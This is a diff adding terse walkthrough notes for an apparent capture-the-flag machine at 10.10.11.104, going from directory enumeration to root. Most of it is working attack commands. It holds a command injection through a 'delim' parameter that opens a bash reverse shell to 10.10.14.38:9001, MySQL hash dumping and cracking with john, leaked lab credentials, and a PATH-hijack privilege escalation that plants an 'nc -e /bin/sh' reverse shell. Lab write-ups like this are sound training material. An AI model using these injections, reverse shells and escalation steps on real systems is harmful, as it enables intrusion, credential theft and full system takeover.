@@ -1,0 +1,28 @@
+//With some hints from Hritik Rai
+gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.104 -o gobuster.txt -x php
+http://10.10.11.104/nav.php
+http://10.10.11.104/accounts.php
+//intercept it with burp and change response to 200 OK
+//create account & login
+//Files/ Download sitebackup.zip
+//config.php -> root : mySQL_p@ssw0rd!:) : previse (db)
+tcpdump -i tun0 icmp
+http://10.10.11.104/file_logs.php
+	delim=comma; ping -c 1 10.10.14.38	//got ping back
+	delim=comma; bash -c 'bash -i >& /dev/tcp/10.10.14.38/9001 0>&1'	//urlencode, got www-data shell
+
+mysql -u root -p
+SELECT host, user, authentication_string FROM mysql.user;
+john --format=md5crypt-long --show --wordlist=password hash
+m4lwhere : ilovecody112235!
+ssh m4lwhere@10.10.11.104		//got user
+
+sudo -l
+/opt/scripts/access_backup.sh		//"date" can be hijacked
+export PATH=$(pwd):$PATH
+vim date				//put reverse shell here
+	nc -e /bin/sh 10.10.14.38 9001
+
+nc -lvnp 9001
+
+sudo /opt/scripts/access_backup.sh	//got root
